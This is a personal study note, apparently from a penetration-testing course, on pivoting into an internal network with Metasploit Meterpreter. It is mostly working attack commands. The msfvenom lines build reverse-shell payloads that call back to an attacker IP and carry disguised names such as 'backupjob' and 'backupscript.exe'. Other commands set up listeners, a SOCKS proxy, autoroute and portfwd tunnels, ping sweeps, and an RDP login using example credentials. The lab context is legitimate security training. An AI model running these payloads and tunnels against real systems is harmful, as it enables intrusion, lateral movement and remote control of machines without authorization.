Key idea
- Can do all of the previous techniques **without SSH**, instead using a Meterpreter reverse shell from the pivot as the tunnel instead of SSH.

# Dynamic Port Forwarding with Meterpreter 

## Setting up the Meterpreter Shell
1. Create payload for Ubuntu Pivot host
	- `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080`
	- Replace lhost with our own ip
2. Start multi handler on our own machine
	- `msfconsole`
	- `use exploit/multi/handler`
	- `set lhost 0.0.0.0`
	- `set lport 8080`
	- `set payload linux/x64/meterpreter/reverse_tcp`
	- `run`
3. Copy the payload over to the Ubuntu pivot with SSH (or other methods)
	- Eg. host a python3 http server on own machine and wget on Ubuntu
	- See [[3. Linux Downloads (local to target)]]
4. Execute the payload on the Ubuntu host

## Using the shell
- We now have access to the internal network through the Ubuntu pivot using the Meterpreter Shell.
- We know that the windows target is on the 172.16.5.0/23 network
	- Could have figured this out from ifconfig (?) to see what internal IP the Ubuntu pivot has??
- Ping sweep
	- In meterpreter, run `run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23`

*note
- Can also do manual ping sweeps
- Linux
	- `for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done`
- CMD
	- `for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"`
- PowerShell
	- `1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}`
- Note that ping sweeps ma fail the first time because arp cache is being built

- Nmap scan
	- Maybe host's firewall blocks ping (ICMP) and ping gets no successful replies
	- Then need TCP scan with NMAp
	- Since this is **dynamic port forwarding** , need SOCKS
	- Configure socks proxy on **local** attack host
		- See [[2. Static and Dynamic Port Forwarding with SSH and SOCKS Tunneling]] for recap
		- `msfconsole`
		- `use auxiliary/server/socks_proxy`
		- `set srvport 9050`
		- `set srvhost 0.0.0.0
		- `set version 4a`
		- `run`
	- Now we have a SOCKS listener that is listening on localhost:9050
	-  To confirm that the proxy Server is running,
		- `msf6 auxiliary(server/socks_proxy) > jobs`
	- Like last time, edit `/etc/proxychains/conf` to add the correct port (in this case, 9050)
	- We need to tell the SOCKS proxy we just set up which Meterpreter session to send traffic to
		- In `msfconsole`,
		- `use post/multi/manage/autoroute`
		- `set SESSION 1`
		- `set SUBNET 172.16.5.0`
		- Now Metasploit knows, anything destined for that subnet must go through session 1
	- Can also add routes with autoroute by running autoroute from Meterpreter session
		- In Meterpreter,
		- `run autoroute -s 172.16.5.0/23`
	- List active routes with `-p`
		- `run autoroute -p`
	- So when I run `proxychains nmap 172.16.5.19 -p 3389`, the real path is

```
nmap
 ↓
proxychains
 ↓
127.0.0.1:9050 (SOCKS proxy)
 ↓
Metasploit checks routing table
 ↓
Route match: 172.16.5.0/23 → Session 1
 ↓
Traffic injected into Meterpreter session
 ↓
Ubuntu pivot sends packet to 172.16.5.19
```



# Local Port Forwarding with Meterpreter
- Meterpreter's **portfwd** module
- Can enable a listener on our attack host, and request Meterpreter to forward all packets received on this port via the Meterpreter session to a remote host on the 172.16.5.0/23 network
- Inside meterpreter
	- `portfwd add -l 3300 -p 3389 -r 172.16.5.19`
		- Start listener on our local port 3300 and forward all packets to the remote (-r) Windows server 172.16.5.19 on 3389 port
	- `locahost:3300 -> 172.16.5.19:3389`
- So for eg.
	- Executing xfreerdp on localhost:3300 lets us connect to the Windows machine
	- `xfreerdp /v:localhost:3300 /u:victor /p:pass@123`
- `netstat -antp`

# Meterpreter Reverse Port Forwarding
- Listen on specific port on compromised server and forward all incoming shells from Ubuntu server to attack host
- Inside meterpreter
	- `portfwd add -R -l 8081 -p 1234 -L 10.10.14.18`
		- `Ubuntu:1234 -> Our machine:8081`
		- Requests Ubuntu machine to forward all requests received on port 1234 to our listener on port 8081
	- Then setup the listener (also on our own macchine)
		- `bg` (to background the meterpreter session to get into msfconsole)
		- `use exploit/multi/handler`
		- `set payload windows/x64/meterpreter/reverse_tcp`
		- `set lport 8081`
		- `set lhost 0.0.0.0`
		- `run`
- Then generate the Windows payload
	- `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234`
	- Remember to send it to Ubuntu machine, not us
	- `172.16.5.129:1234` is the Ubuntu port that will forward the shell to our listener on 8081.
